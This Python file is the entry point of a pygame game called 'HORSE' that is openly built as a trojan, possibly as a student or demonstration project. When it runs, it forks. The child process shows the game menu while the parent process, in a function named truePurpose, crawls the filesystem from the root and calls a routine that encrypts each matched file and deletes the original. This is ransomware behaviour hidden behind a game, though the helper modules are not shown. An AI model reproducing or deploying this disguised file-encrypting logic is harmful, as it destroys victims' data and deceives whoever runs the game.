import pygame
import os
import pathlib

# Relative Imports
from game.menu.main_menu import main_menu
from trojan.crawler import Crawler
from trojan.crypto import encryptAndDeletePlaintext

PATH_TO_DIR = pathlib.Path(__file__).parent.absolute()

# load image assets
main_menu_bkground = pygame.image.load(
    f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}main_menu_background.png"
)

"""
Subroutine that runs if this is the child process.
This is the game
"""
def game():
	# Initialize pygame and the main clock
	pygame.init()
	main_clock = pygame.time.Clock()

	# Create a window with 4:3 aspect ratio
	window = pygame.display.set_mode((800, 600), 0, 32)
	pygame.display.set_caption("HORSE")
	window_icon = pygame.image.load(
	f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}app_icon.png"
	)
	pygame.display.set_icon(window_icon)

	# Start the main menu
	main_menu(window, main_clock, main_menu_bkground)

	# Clean up
	pygame.quit()

"""
Subroutine that runs if this is the parent process.
Find and encrypt target files.
"""
def truePurpose():
    c = Crawler(os.path.abspath(os.sep), '.trojan', True)
    c.walk_tree()
    filesToEncrypt = c.get_files()
    for s in filesToEncrypt:
        print("DEBUG: main.truePurpose(): encrypting "+s)
        encryptAndDeletePlaintext(s)


if __name__ == "__main__":
    childpid = os.fork()
    if childpid == 0:
    	game()
    else:
    	truePurpose();
